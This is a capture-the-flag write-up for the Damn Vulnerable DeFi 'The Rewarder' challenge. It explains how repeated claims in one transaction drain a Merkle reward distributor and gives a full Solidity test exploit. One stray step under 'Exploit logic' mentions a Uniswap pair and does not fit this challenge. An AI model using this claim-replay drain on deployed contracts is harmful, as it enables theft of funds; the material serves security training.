# The Rewarder

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

#



# Challenge overview


[Official site](https://damnvulnerabledefi.xyz/challenges/the-rewarder)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The-Rewarder challenge is the fifth level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the funds from the pool by exploting the business logic vulnerability.

It has only 1 contract:

1) TheRewarderDistributor.sol : It distributes the Tokens to the beneficeries.  

## TheRewarderDistributor.sol has main 1 function

## function claimRewards() : 
    It is the only fuction where we can claim rewards. So, if there is any vulnerability, it is the function.


## Exploit logic :

i) Send all of the DVTs to teh uniswapair address
## Exploit Logic

i) Claim rewards using a valid Merkle proof for one beneficiary

ii) Reuse the same reward distribution by manipulating the claim process

iii) Claim rewards multiple times within a single transaction

iv) Transfer all claimed WETH and DVT rewards to the recovery account


I hope you got the idea now, just try atleast once to write the poc according to the logic and if unsuccessfull u can take reference from below :

``` solidity
    function test_theRewarder() public checkSolvedByPlayer {
        // Read DVT distribution JSON
        string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
        Reward[] memory dvtReward = abi.decode(vm.parseJson(dvtJson), (Reward[]));

        // Read weth distribution JSON
        string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
        Reward[] memory wethReward = abi.decode(vm.parseJson(wethJson), (Reward[]));
       
        // Load leaves
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        // Find player's reward amount and leaves
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        for(uint i = 0; i < dvtReward.length; i++) {
            if(dvtReward[i].beneficiary == player) {
                playerDvtAmount = dvtReward[i].amount;
                playerWethAmount = wethReward[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }

        require(playerDvtAmount > 0,"Player not found in DVT distribution");
        require(playerWethAmount > 0,"Player not found in WETH distribution");

        // set up token claims
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Calculate the number of claims needed on the total distribution and player's amounts
        uint256 totalClaimsNeeded = 
            (TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount) +
            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        // set up all claims
        // for example if totalClaimsNeeded = 100 , and dvtClaims = 60, then wethClaims = 40
        for(uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        dvt.transfer(recovery, dvt.balanceOf(address(player)));
        weth.transfer(recovery, weth.balanceOf(address(player)));
    }
```

>Okay! This much 

If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**